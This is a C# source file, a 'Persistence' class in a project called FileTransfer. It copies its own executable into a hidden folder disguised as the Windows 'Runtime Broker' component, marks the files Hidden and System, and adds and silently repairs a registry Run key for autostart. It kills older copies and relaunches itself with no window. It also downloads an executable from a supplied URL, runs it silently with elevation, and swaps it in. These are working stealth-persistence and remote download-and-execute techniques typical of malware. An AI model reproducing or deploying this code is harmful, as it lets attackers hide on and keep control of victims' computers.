using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace FileTransfer
{
    public static class Persistence
    {
        private static void Log(string msg)
        {
            try
            {
                string logDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "Themes");
                Directory.CreateDirectory(logDir);
                string logFile = Path.Combine(logDir, "ft.log");
                File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [PERSIST] {msg}\n");
            }
            catch { }
        }

        private static readonly string DestDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Windows", "RuntimeBrokerDild");

        public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
        private static readonly string Marker = Path.Combine(DestDir, "wsc.dat");
        private const string RunKeyName = "RuntimeBrokerDild";

        public static bool IsInstalled() => File.Exists(Marker);

        public static bool IsRunningFromClone()
        {
            try
            {
                string current = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                return current.Equals(DestExe, StringComparison.OrdinalIgnoreCase);
            }
            catch
            {
                return false;
            }
        }

        public static void KillExistingClone()
        {
            try
            {
                foreach (var p in Process.GetProcessesByName("Runtime Broker"))
                {
                    try
                    {
                        string? path = p.MainModule?.FileName;
                        if (!string.IsNullOrEmpty(path) && path.Equals(DestExe, StringComparison.OrdinalIgnoreCase))
                        {
                            Log($"Killing old clone PID={p.Id}");
                            p.Kill();
                            p.WaitForExit(3000);
                        }
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Log($"KillExistingClone error: {ex.Message}");
            }
        }

        public static void Install()
        {
            Log("Install start");
            try
            {
                string source = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                Log("Source exe: " + source);
                if (string.IsNullOrEmpty(source)) return;

                // Убиваем старый клон если запущен (чтобы перезаписать файл)
                KillExistingClone();

                // Снимаем атрибуты System+Hidden если файл остался от предыдущей установки
                try { if (File.Exists(DestExe)) File.SetAttributes(DestExe, FileAttributes.Normal); } catch { }
                try { if (File.Exists(Marker)) File.SetAttributes(Marker, FileAttributes.Normal); } catch { }

                // Всегда перезаписываем файлы (обновление версии)
                Log("Installing/updating files...");
                Directory.CreateDirectory(DestDir);

                string sourceDir = Path.GetDirectoryName(source) ?? "";
                string? cloneFolder = !string.IsNullOrEmpty(sourceDir)
                    ? Path.Combine(sourceDir, "clone")
                    : null;

                bool hasCloneFolder = cloneFolder != null && Directory.Exists(cloneFolder);

                if (hasCloneFolder)
                {
                    Log($"Using pre-built clone from {cloneFolder}");
                    CopyDirectoryContents(cloneFolder, DestDir, source);
                }
                else
                {
                    Log("No pre-built clone, copying from source");
                    CopyDirectoryContents(sourceDir, DestDir, source);
                    File.Copy(source, DestExe, true);
                }

                File.SetAttributes(DestExe, FileAttributes.Hidden | FileAttributes.System);

                AddToAutoStart();

                File.WriteAllText(Marker, DateTime.Now.ToString());
                File.SetAttributes(Marker, FileAttributes.Hidden | FileAttributes.System);

                Log("Install finished OK");
            }
            catch (Exception ex)
            {
                Log("Install error: " + ex);
                Debug.WriteLine("Persistence install error: " + ex.Message);
            }
        }

        private static void CopyDirectoryContents(string sourceDir, string destDir, string? skipFile = null)
        {
            if (!Directory.Exists(sourceDir)) return;
            foreach (string file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
            {
                string rel = Path.GetRelativePath(sourceDir, file);
                string dest = Path.Combine(destDir, rel);

                string ext = Path.GetExtension(file).ToLowerInvariant();
                if (ext == ".pdb" || ext == ".xml")
                    continue;

                if (skipFile != null && file.Equals(skipFile, StringComparison.OrdinalIgnoreCase))
                    continue;

                string? destDir2 = Path.GetDirectoryName(dest);
                if (!string.IsNullOrEmpty(destDir2))
                    Directory.CreateDirectory(destDir2);
                File.Copy(file, dest, true);
            }
        }

        private static void AddToAutoStart()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                if (key != null)
                {
                    key.SetValue(RunKeyName, $"\"{DestExe}\" --background");
                    Log("Autostart registry key added");
                }
            }
            catch (Exception ex)
            {
                Log("AddToAutoStart error: " + ex.Message);
            }
        }

        public static void EnsureAutoStart()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                if (key != null)
                {
                    string? current = key.GetValue(RunKeyName) as string;
                    string desired = $"\"{DestExe}\" --background";
                    if (string.IsNullOrEmpty(current) || current != desired)
                    {
                        key.SetValue(RunKeyName, desired);
                        Log("Autostart registry key repaired");
                    }
                }
            }
            catch (Exception ex)
            {
                Log("EnsureAutoStart error: " + ex.Message);
            }
        }

        public static void LaunchClone()
        {
            try
            {
                if (File.Exists(DestExe))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = DestExe,
                        Arguments = "--background",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    Process.Start(psi);
                    Log("Clone launched");
                }
            }
            catch (Exception ex)
            {
                Log("LaunchClone error: " + ex.Message);
            }
        }

        public static async System.Threading.Tasks.Task<bool> PerformUpdate(string updateUrl)
        {
            Log($"PerformUpdate start: {updateUrl}");
            try
            {
                string tempFile = Path.Combine(Path.GetTempPath(), "ft_update_" + Guid.NewGuid().ToString("N") + ".exe");
                Log($"Downloading update to: {tempFile}");
                
                using (var hc = new System.Net.Http.HttpClient())
                {
                    var responseBytes = await hc.GetByteArrayAsync(updateUrl);
                    File.WriteAllBytes(tempFile, responseBytes);
                }
                Log("Download finished");

                bool isSetup = updateUrl.EndsWith("setup.exe", StringComparison.OrdinalIgnoreCase) || updateUrl.Contains("setup");
                if (isSetup)
                {
                    Log("Executing installer silently...");
                    var psi = new ProcessStartInfo
                    {
                        FileName = tempFile,
                        Arguments = "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART",
                        UseShellExecute = true,
                        Verb = "runas"
                    };
                    var proc = Process.Start(psi);
                    if (proc != null)
                    {
                        proc.WaitForExit();
                        Log($"Installer finished with exit code: {proc.ExitCode}");
                    }
                    
                    string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                    if (string.IsNullOrEmpty(programFiles)) programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    
                    string installedPath = "";
                    string shonllPath = Path.Combine(programFiles, "RAH NonPro", "RAH Non Pro.exe");
                    string dildmanPath = Path.Combine(programFiles, "NON PRO", "Non Pro.exe");
                    
                    if (File.Exists(shonllPath)) installedPath = shonllPath;
                    else if (File.Exists(dildmanPath)) installedPath = dildmanPath;
                    
                    if (string.IsNullOrEmpty(installedPath))
                    {
                        programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                        shonllPath = Path.Combine(programFiles, "RAH NonPro", "RAH Non Pro.exe");
                        dildmanPath = Path.Combine(programFiles, "NON PRO", "Non Pro.exe");
                        if (File.Exists(shonllPath)) installedPath = shonllPath;
                        else if (File.Exists(dildmanPath)) installedPath = dildmanPath;
                    }

                    if (!string.IsNullOrEmpty(installedPath) && File.Exists(installedPath))
                    {
                        Log($"Found installed exe: {installedPath}");
                        string backupPath = DestExe + ".bak";
                        if (File.Exists(backupPath)) File.Delete(backupPath);
                        if (File.Exists(DestExe)) File.Move(DestExe, backupPath);
                        File.Copy(installedPath, DestExe, true);
                        Log("Successfully replaced DestExe with newly installed exe");
                    }
                    else
                    {
                        throw new FileNotFoundException("Could not find installed executable in Program Files.");
                    }
                }
                else
                {
                    Log("Updating directly from downloaded executable");
                    string backupPath = DestExe + ".bak";
                    if (File.Exists(backupPath)) File.Delete(backupPath);
                    if (File.Exists(DestExe)) File.Move(DestExe, backupPath);
                    File.Copy(tempFile, DestExe, true);
                    Log("Successfully replaced DestExe with direct executable");
                }

                try { File.Delete(tempFile); } catch { }

                Log("Relaunching updated clone...");
                Process.Start(DestExe);
                Log("Exiting current process");
                Environment.Exit(0);
                return true;
            }
            catch (Exception ex)
            {
                Log($"PerformUpdate error: {ex.ToString()}");
                return false;
            }
        }
    }
}
